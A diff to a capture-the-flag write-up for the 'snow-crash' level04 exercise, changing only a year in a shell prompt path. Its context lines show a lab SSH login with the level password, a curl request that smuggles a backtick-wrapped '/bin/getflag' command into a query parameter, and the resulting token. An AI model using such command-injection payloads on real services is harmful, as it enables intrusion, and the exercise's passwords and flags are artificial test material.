@@ -1,6 +1,6 @@
 ### TLTR;
 ```shell
-┌──$ [~/42/2020/snow-crash]
+┌──$ [~/42/2021/snow-crash]
 └─>  ssh 192.168.1.64 -p 4242 -l level04
 level04@192.168.1.64's password: qi0maab88jeaj46qoumi7maus
 level04@SnowCrash:~$ curl localhost:4747/?x="\`/bin/getflag\`"
@@ -11,7 +11,7 @@ Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
 
 Login as `level04`.
 ```shell
-┌──$ [~/42/2020/snow-crash]
+┌──$ [~/42/2021/snow-crash]
 └─>  ssh 192.168.1.64 -p 4242 -l level04
 level04@192.168.1.64's password: qi0maab88jeaj46qoumi7maus
 ```
